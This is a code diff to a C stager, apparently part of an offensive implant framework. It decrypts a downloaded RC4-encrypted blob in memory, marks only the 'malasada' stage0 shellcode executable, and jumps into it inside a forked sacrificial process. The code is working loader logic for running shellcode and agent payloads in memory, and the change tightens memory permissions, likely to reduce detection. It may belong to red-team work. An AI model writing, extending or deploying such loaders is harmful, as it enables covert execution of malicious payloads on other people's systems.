@@ -22,10 +22,23 @@ typedef void (*downloader_fn)(struct download_result *);
 typedef void (*stage1_entry)(void *base_addr, size_t total_size);
 
 /*
- * Decrypt the downloaded ciphertext in place, flip it to RX, and enter the
- * payload. In supervision mode this runs in the forked child, so copy-on-write
- * confines the plaintext and the RX transition to the sacrificial process; the
- * parent's mapping stays ciphertext RW.
+ * malasada lays the agent out as [stage0 shellcode][msda header][payload].
+ * Only the stage0 prefix needs to execute; the appended payload is data and
+ * stays read-only. The prefix length is a build-time constant taken from the
+ * pinned malasada stage0 binary (see MALASADA_STAGE0_LEN in the Makefile), so
+ * the stub never has to guess where the code ends at runtime.
+ */
+#ifndef MALASADA_STAGE0_LEN
+#define MALASADA_STAGE0_LEN 0
+#endif
+
+/*
+ * Decrypt the downloaded ciphertext in place, then map only the malasada
+ * stage0 shellcode executable and enter it. The payload follows as read-only
+ * data; stage0 later maps the agent ELF segments with their own per-segment
+ * permissions. In supervision mode this runs in the forked child, so
+ * copy-on-write confines every one of these permission changes to the
+ * sacrificial process while the parent's mapping stays ciphertext RW.
  */
 static void stage_run(void *arg) {
   struct download_result *res = (struct download_result *)arg;
@@ -35,8 +48,18 @@ static void stage_run(void *arg) {
   memset(res->key, 0, sizeof(res->key));
   rc4_crypt(&rc4, (uint8_t *)res->data, res->size);
 
-  if (mprotect(res->data, PAGE_ALIGN_UP(res->size),
-               PROT_READ | PROT_EXEC) != 0)
+  /* With no known stage0 length, fall back to running the whole blob (the
+   * previous behaviour); the constant is always set by the Makefile. */
+  size_t rx_len = (MALASADA_STAGE0_LEN > 0)
+                      ? PAGE_ALIGN_UP((size_t)MALASADA_STAGE0_LEN)
+                      : PAGE_ALIGN_UP(res->size);
+  if (rx_len > PAGE_ALIGN_UP(res->size))
+    rx_len = PAGE_ALIGN_UP(res->size);
+  if (mprotect(res->data, rx_len, PROT_READ | PROT_EXEC) != 0)
+    exit(1);
+  if (res->size > rx_len &&
+      mprotect((uint8_t *)res->data + rx_len, res->size - rx_len,
+               PROT_READ) != 0)
     exit(1);
 
   ((stage1_entry)res->data)(res->data, res->size);
